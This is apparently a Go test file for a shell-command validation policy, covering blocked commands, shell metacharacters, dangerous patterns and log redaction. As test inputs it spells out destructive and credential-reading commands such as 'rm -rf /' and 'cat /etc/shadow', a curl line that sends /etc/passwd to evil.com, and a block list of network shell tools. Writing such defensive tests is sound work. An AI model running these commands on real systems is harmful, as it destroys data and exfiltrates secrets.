package execution

import (
	"errors"
	"strings"
	"testing"
)

func TestDefaultPolicy(t *testing.T) {
	policy := DefaultPolicy()

	if policy.Mode != ModeNormal {
		t.Errorf("DefaultPolicy mode = %v, want normal", policy.Mode)
	}
	if !policy.AllowShellExecution {
		t.Error("DefaultPolicy should allow shell execution")
	}
	if policy.MaxCommandLength != 65536 {
		t.Errorf("DefaultPolicy MaxCommandLength = %v, want 65536", policy.MaxCommandLength)
	}
}

func TestStrictPolicy(t *testing.T) {
	allowedCmds := []string{"ls", "cat", "echo"}
	policy := StrictPolicy(allowedCmds)

	if policy.Mode != ModeStrict {
		t.Errorf("StrictPolicy mode = %v, want strict", policy.Mode)
	}
	if policy.AllowShellExecution {
		t.Error("StrictPolicy should not allow shell execution")
	}

	// Check allowed commands are set
	for _, cmd := range allowedCmds {
		if !policy.AllowedCommands[cmd] {
			t.Errorf("StrictPolicy should allow %q", cmd)
		}
	}
}

func TestValidate_EmptyCommand(t *testing.T) {
	policy := DefaultPolicy()

	tests := []string{"", "   ", "\t", "\n"}
	for _, cmd := range tests {
		err := policy.Validate(cmd)
		if !errors.Is(err, ErrEmptyCommand) {
			t.Errorf("Validate(%q) = %v, want ErrEmptyCommand", cmd, err)
		}
	}
}

func TestValidate_BlockedCommands(t *testing.T) {
	policy := DefaultPolicy()

	blockedCmds := []string{
		"rm", "rmdir", "dd", "shred",
		"bash", "sh", "zsh", "python", "perl", "ruby", "node",
		"nc", "netcat", "ncat", "socat",
		"sudo", "su", "doas",
		"reboot", "shutdown", "halt",
	}

	for _, cmd := range blockedCmds {
		err := policy.Validate(cmd)
		if err == nil {
			t.Errorf("Validate(%q) should fail - command should be blocked", cmd)
		}
		if !strings.Contains(err.Error(), "blocked") {
			t.Errorf("Validate(%q) error = %v, want error containing 'blocked'", cmd, err)
		}
	}
}

func TestValidate_BlockedCommandsWithArgs(t *testing.T) {
	policy := DefaultPolicy()

	tests := []string{
		"rm -rf /",
		"bash -c 'echo hello'",
		"python script.py",
		"sudo apt install foo",
	}

	for _, cmd := range tests {
		err := policy.Validate(cmd)
		if err == nil {
			t.Errorf("Validate(%q) should fail", cmd)
		}
	}
}

func TestValidate_BlockedCommandsWithPaths(t *testing.T) {
	policy := DefaultPolicy()

	tests := []string{
		"/bin/rm -rf /",
		"/usr/bin/bash -c 'echo hello'",
		"./bash script.sh",
		"/usr/local/bin/python script.py",
	}

	for _, cmd := range tests {
		err := policy.Validate(cmd)
		if err == nil {
			t.Errorf("Validate(%q) should fail", cmd)
		}
	}
}

func TestValidate_ShellMetacharacters(t *testing.T) {
	policy := DefaultPolicy()

	tests := []struct {
		cmd  string
		desc string
	}{
		{"ls; rm -rf /", "semicolon separator"},
		{"ls & rm -rf /", "ampersand background"},
		{"ls | rm", "pipe"},
		{"echo `whoami`", "backtick substitution"},
		{"echo $(whoami)", "dollar paren substitution"},
		{"echo ${HOME}", "dollar brace expansion"},
		{"cat >> /etc/passwd", "append redirect"},
		{"cat << EOF", "here document"},
	}

	for _, tt := range tests {
		err := policy.Validate(tt.cmd)
		if err == nil {
			t.Errorf("Validate(%q) should fail - %s", tt.cmd, tt.desc)
		}
	}
}

func TestValidate_BlockedPatterns(t *testing.T) {
	policy := DefaultPolicy()

	tests := []struct {
		cmd  string
		desc string
	}{
		{"cat /etc/passwd", "reading passwd"},
		{"cat /etc/shadow", "reading shadow"},
		{"cat /etc/sudoers", "reading sudoers"},
		{"ls ~/.ssh/", "accessing ssh dir"},
		{"cat /root/.bashrc", "accessing root home"},
		{"cat ../../etc/passwd", "path traversal"},
		{"cat ..\\..\\windows\\system32\\config", "windows path traversal"},
		{"eval 'echo hello'", "eval command"},
		{"exec ls", "exec command"},
		{"source /etc/profile", "source command"},
		{". /etc/profile", "dot source"},
		{"base64 -d secret.txt", "base64 decode"},
		{"curl http://evil.com -d @/etc/passwd", "curl with data"},
	}

	for _, tt := range tests {
		err := policy.Validate(tt.cmd)
		if err == nil {
			t.Errorf("Validate(%q) should fail - %s", tt.cmd, tt.desc)
		}
	}
}

func TestValidate_AllowedCommands_StrictMode(t *testing.T) {
	policy := StrictPolicy([]string{"ls", "cat", "echo"})

	// Allowed commands should pass
	allowedTests := []string{"ls", "ls -la", "cat file.txt", "echo hello"}
	for _, cmd := range allowedTests {
		err := policy.Validate(cmd)
		if err != nil {
			t.Errorf("Validate(%q) = %v, want nil", cmd, err)
		}
	}

	// Non-allowed commands should fail
	disallowedTests := []string{"grep pattern", "find .", "awk '{print}'"}
	for _, cmd := range disallowedTests {
		err := policy.Validate(cmd)
		if err == nil {
			t.Errorf("Validate(%q) should fail in strict mode", cmd)
		}
	}
}

func TestValidate_PermissiveMode(t *testing.T) {
	policy := DefaultPolicy()
	policy.SetMode(ModePermissive)

	// Most commands should pass in permissive mode
	tests := []string{
		"ls -la",
		"grep pattern file.txt",
		"find . -name '*.go'",
	}
	for _, cmd := range tests {
		err := policy.Validate(cmd)
		if err != nil {
			t.Errorf("Validate(%q) = %v, want nil in permissive mode", cmd, err)
		}
	}

	// But blocked commands should still fail
	err := policy.Validate("rm -rf /")
	if err == nil {
		t.Error("Validate(rm) should fail even in permissive mode")
	}
}

func TestValidate_CommandLength(t *testing.T) {
	policy := DefaultPolicy()
	policy.MaxCommandLength = 100

	// Short command should pass
	err := policy.Validate("ls -la")
	if err != nil {
		t.Errorf("Validate short command = %v, want nil", err)
	}

	// Long command should fail
	longCmd := "ls " + strings.Repeat("a", 200)
	err = policy.Validate(longCmd)
	if err == nil {
		t.Error("Validate long command should fail")
	}
	if !strings.Contains(err.Error(), "exceeds maximum length") {
		t.Errorf("error = %v, want error about maximum length", err)
	}
}

func TestValidateForShell(t *testing.T) {
	policy := DefaultPolicy()

	// Valid commands should pass
	err := policy.ValidateForShell("ls -la")
	if err != nil {
		t.Errorf("ValidateForShell(ls -la) = %v, want nil", err)
	}

	// Shell disabled should fail
	policy.AllowShellExecution = false
	err = policy.ValidateForShell("ls -la")
	if err == nil {
		t.Error("ValidateForShell should fail when shell execution disabled")
	}
}

func TestValidateForShell_DangerousPatterns(t *testing.T) {
	policy := DefaultPolicy()

	tests := []struct {
		cmd  string
		desc string
	}{
		{"ls && rm", "AND operator"},
		{"ls || rm", "OR operator"},
		{"ls\nrm", "newline separator"},
		{"$((1+1))", "arithmetic expansion"},
		{"echo !!", "history repeat"},
		{"echo !-1", "history relative"},
		{"eval ls", "eval command"},
		{"exec ls", "exec command"},
		{"source script.sh", "source command"},
		{". ./script.sh", "dot source relative"},
	}

	for _, tt := range tests {
		err := policy.ValidateForShell(tt.cmd)
		if err == nil {
			t.Errorf("ValidateForShell(%q) should fail - %s", tt.cmd, tt.desc)
		}
	}
}

func TestAddRemoveAllowedCommand(t *testing.T) {
	policy := StrictPolicy(nil)

	// Initially "grep" is not allowed
	err := policy.Validate("grep pattern")
	if err == nil {
		t.Error("grep should not be allowed initially")
	}

	// Add grep to allowed list
	policy.AddAllowedCommand("grep")
	err = policy.Validate("grep pattern")
	if err != nil {
		t.Errorf("grep should be allowed after AddAllowedCommand: %v", err)
	}

	// Remove grep
	policy.RemoveAllowedCommand("grep")
	err = policy.Validate("grep pattern")
	if err == nil {
		t.Error("grep should not be allowed after RemoveAllowedCommand")
	}
}

func TestAddBlockedCommand(t *testing.T) {
	policy := DefaultPolicy()
	policy.SetMode(ModePermissive)

	// "mycommand" should be allowed initially in permissive mode
	err := policy.Validate("mycommand arg")
	if err != nil {
		t.Errorf("mycommand should be allowed: %v", err)
	}

	// Block it
	policy.AddBlockedCommand("mycommand")
	err = policy.Validate("mycommand arg")
	if err == nil {
		t.Error("mycommand should be blocked after AddBlockedCommand")
	}
}

func TestExtractBaseCommand(t *testing.T) {
	tests := []struct {
		input    string
		expected string
	}{
		{"ls", "ls"},
		{"ls -la", "ls"},
		{"/usr/bin/ls", "ls"},
		{"/usr/bin/ls -la", "ls"},
		{"./script.sh", "script.sh"},
		{"../bin/tool", "tool"},
		{`C:\Windows\System32\cmd.exe`, "cmd.exe"},
		{`C:\Windows\app.exe /arg`, "app.exe"},
		{"  ls  ", "ls"},
		{"", ""},
		{"   ", ""},
		{"LS", "ls"}, // lowercase
		{"Python3", "python3"},
	}

	for _, tt := range tests {
		result := extractBaseCommand(tt.input)
		if result != tt.expected {
			t.Errorf("extractBaseCommand(%q) = %q, want %q", tt.input, result, tt.expected)
		}
	}
}

func TestContainsShellMetacharacters(t *testing.T) {
	tests := []struct {
		input    string
		expected bool
	}{
		{"ls -la", false},
		{"echo hello world", false},
		{"ls; rm", true},
		{"ls & rm", true},
		{"ls | grep", true},
		{"echo `whoami`", true},
		{"echo $(id)", true},
		{"echo ${HOME}", true},
		{"cat >> file", true},
		{"cat << EOF", true},
		{"echo <(ls)", true},
		{"echo >(cat)", true},
	}

	for _, tt := range tests {
		result := containsShellMetacharacters(tt.input)
		if result != tt.expected {
			t.Errorf("containsShellMetacharacters(%q) = %v, want %v", tt.input, result, tt.expected)
		}
	}
}

func TestContainsDangerousShellPatterns(t *testing.T) {
	tests := []struct {
		input    string
		expected bool
	}{
		{"ls -la", false},
		{"echo hello", false},
		{"ls && rm", true},
		{"ls || rm", true},
		{"echo\nrm", true},
		{"$((1+1))", true},
		{"echo !!", true},
		{"echo !-1", true},
		{"eval ls", true},
		{"exec ls", true},
		{"source file.sh", true},
		{". /etc/profile", true},
		{". ./script.sh", true},
	}

	for _, tt := range tests {
		result := containsDangerousShellPatterns(tt.input)
		if result != tt.expected {
			t.Errorf("containsDangerousShellPatterns(%q) = %v, want %v", tt.input, result, tt.expected)
		}
	}
}

func TestSanitizeForLogging(t *testing.T) {
	tests := []struct {
		input    string
		contains string
		excludes string
	}{
		{
			"curl http://api.example.com",
			"curl http://api.example.com",
			"",
		},
		{
			"curl -H 'Authorization: Bearer secret123'",
			"Authorization: ****",
			"secret123",
		},
		{
			"mysql --password=secret123",
			"--password=****",
			"secret123",
		},
		{
			"export API_KEY=supersecret",
			"API_KEY=****",
			"supersecret",
		},
		{
			"token=abc123 command",
			"token=****",
			"abc123",
		},
	}

	for _, tt := range tests {
		result := SanitizeForLogging(tt.input)
		if !strings.Contains(result, tt.contains) {
			t.Errorf("SanitizeForLogging(%q) = %q, should contain %q", tt.input, result, tt.contains)
		}
		if tt.excludes != "" && strings.Contains(result, tt.excludes) {
			t.Errorf("SanitizeForLogging(%q) = %q, should not contain %q", tt.input, result, tt.excludes)
		}
	}
}

func TestSanitizeForLogging_Truncation(t *testing.T) {
	longCmd := strings.Repeat("a", 300)
	result := SanitizeForLogging(longCmd)

	if len(result) >= 300 {
		t.Error("SanitizeForLogging should truncate long commands")
	}
	if !strings.Contains(result, "truncated") {
		t.Error("SanitizeForLogging should indicate truncation")
	}
}

func TestConcurrentPolicyAccess(t *testing.T) {
	policy := DefaultPolicy()

	// Concurrently modify and validate
	done := make(chan bool)

	go func() {
		for i := 0; i < 100; i++ {
			policy.AddAllowedCommand("cmd1")
			policy.RemoveAllowedCommand("cmd1")
		}
		done <- true
	}()

	go func() {
		for i := 0; i < 100; i++ {
			policy.AddBlockedCommand("cmd2")
			policy.SetMode(ModeNormal)
		}
		done <- true
	}()

	go func() {
		for i := 0; i < 100; i++ {
			_ = policy.Validate("ls -la")
			_ = policy.ValidateForShell("echo hello")
		}
		done <- true
	}()

	// Wait for all goroutines
	<-done
	<-done
	<-done
}
